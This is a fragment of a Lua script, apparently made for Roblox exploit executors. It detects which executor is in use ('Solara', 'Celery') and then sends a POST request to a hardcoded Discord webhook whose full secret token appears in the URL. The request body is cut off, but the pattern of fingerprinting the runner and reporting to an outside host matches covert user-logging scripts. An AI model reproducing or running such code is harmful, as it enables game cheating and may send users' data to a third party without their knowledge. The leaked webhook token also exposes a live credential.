...
local function getexploit()
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Solara") or 
        (isexecutorclosure and "Celery") or
...
(syn and syn.request or http_request or http.request) {
    Url = 'https://discord.com/api/webhooks/1279407092519931916/pzny83ih9aXwALYaSaevDPzRysB7VImM1Hu89bXiBwm9VsmcQBRUc57O0r9qh8lmv3k-';
    Method = 'POST';
    Headers = {
